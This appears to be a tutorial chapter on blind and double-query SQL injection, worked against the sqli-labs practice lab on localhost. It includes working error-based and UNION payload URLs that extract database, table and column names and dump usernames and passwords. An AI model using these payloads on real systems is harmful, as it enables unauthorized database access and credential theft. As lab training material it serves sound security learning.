# Chapter-04

This section will include the basics for blind sql injection. It will cover a few topics that will lay the foundation for blind sqli injection. 

## Work around for cases where comments can't be used

In some cases we may not not be able to use comments in the url to perform sql injection. In such cases we may have to resort to using ```AND``` / ```OR``` operator with appropriate closing element.

Here is an example from lesson-1 of sqli-labs - 

The url will look like this - 

```
http://localhost/sqlilabs/Less-1/?id=1' or '1
```

or 

```
http://localhost/sqlilabs/Less-1/?id=1' and '1
```

Let us now also have a look at the SQL query which gets executed at the backend. 

The given SQL query at the back-end looks like this - 

```
SELECT * FROM users WHERE id='$id' LIMIT 0,1
```

```$id``` gets replaced by the id that the user specifies at the url. 

We inject either ```1' or'1``` or ```1' and '1``` into the url. The sql query after adding ```1'``` and balancing it with ```'1``` looks somewhat like this -  

```
SELECT * FROM users WHERE id='1' or '1' LIMIT 0,1
```

or 

```
SELECT * FROM users WHERE id='1' and '1' LIMIT 0,1
```

:warning: Adding ```'1``` with ```AND``` or ```OR``` balances the SQL Query at the backend. 

## A few roadbumps 

Using ```AND``` or ```OR``` in the sql query has its own drawbacks. Some of them are mentioned below - 

1.  ```ORDER BY``` clause doesn't work well with ```AND``` and ```OR```. Using order-by in such a case will result in no error being thrown irrespective of the number specified in the order by clause.

    Workaround for such a case would be brute force with ```select 1, 2, 3 ...n``` and find the number of columns used in the query. 

1.  ```SELECT * FROM``` also does not work. The ```FROM``` clause when used with ```AND``` or ```OR``` results in an error being thrown. The work around for this error would be to use ```Double SQL injection``` or ```Blind SQL injection``` which is explained in detail below. 

:warning: Double query injection can only be used in cases where the webpage displays some form of an error when the query is broken. If the webpage shows no error message, ```Double Query Injection``` cannot be performed and we may have to resort to ```Blind SQL Injection```.

:boom: Manually performing ```Blind SQL injection``` will take lots of time, hence it has to be automated by making using of an automated script.

## Double Query SQL Injection

The double query SQL injection is a technique that uses a bug in ```MySql``` to extract information. The bug causes the mysql query to throw an error which contains the information that we require. 

The bug is caused when we use ```rand()```, ```count()``` and ```group by``` clause together. 

[This](https://medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c) blog explains in great detail how to reproduce the bug so that we can exploit it and get the useful information. 

This bug can be reproduced by executing this statement - 

```
select count(*), concat((select database()), floor(rand() * 2)) as hack from information_schema.tables group by hack;
```

:warning: The above statement may have to be executed multiple times to see the error. 

The error message will look somewhat like this - 

```Error Code: 1062. Duplicate entry 'security1' for key '<group_key>'```

If you notice carefully, the error message contains the name of the database, i.e. (security). 

Now, the above query can be further manipulated to get more interesting information.

In order to use this in a URL we will have to make slight modifications to the query which are explained below - 

1.  Since this query will be used with an ```AND``` operator, we will have to wrap our payload within another ```MySql``` statement. Wrapping the query inside another query requires us to use the alias in the wrapper query.

The resultant URL will look somewhat like this in the end - 

```
http://localhost/sqlilabs/Less-1/?id=3' and (select 1 from (select count(*), concat((select database()), '+', floor(rand()*2)) as hack from information_schema.tables group by hack) as payload)--+
```

The above ```URL``` can be further modified to obtain the table column names. 

The table names can be obtained by changing the ```limit 0,1``` term. We get different values by choosing different terms such as ```limit 1,1```, ```limit 2,1``` or ```limit 3,1```. 

The ```URL``` will look somewhat like this - 

```
http://localhost/sqlilabs/Less-1/?id=3' and (select 1 from (select count(*), concat((select table_name from information_schema.tables where table_schema=database() limit 0,1), '+', floor(rand()*4)) as hack from information_schema.tables group by hack) as payload)--+
```

The column names can be obtained by following a similar strategy. The ```URL``` for it will look somewhat like this - 

```
http://localhost/sqlilabs/Less-1/?id=3' and (select 1 from (select count(*), concat((select column_name from information_schema.columns where table_name='users' limit 0,1), '+', floor(rand()*4)) as hack from information_schema.tables group by hack) as payload)--+
```

Again, changing the ```limit 0,1``` term yields different results. 

Finally, once we know the column names and the table names, we can dump both the username and password.

```
http://localhost/sqlilabs/Less-1/?id=3' and (select 1 from (select count(*), concat((select password from users limit 0,1), " -- ", floor(rand()*4)) as hack from information_schema.tables group by hack) as payload)--+
```

```
http://localhost/sqlilabs/Less-1/?id=3' and (select 1 from (select count(*), concat((select username from users limit 0,1), " -- ", floor(rand()*4)) as hack from information_schema.tables group by hack) as payload)--+
```

We can also do something like this - 

```
http://localhost/sqlilabs/Less-1/?id=3' and 0 union select 1, group_concat(username), group_concat(password) from users;
```

That will be all for Double Query SQL Injection. :star:

## :star2: Resources 

1.  https://medium.com/cybersecurityservices/sql-injection-double-query-injection-sudharshan-kumar-8222baad1a9c
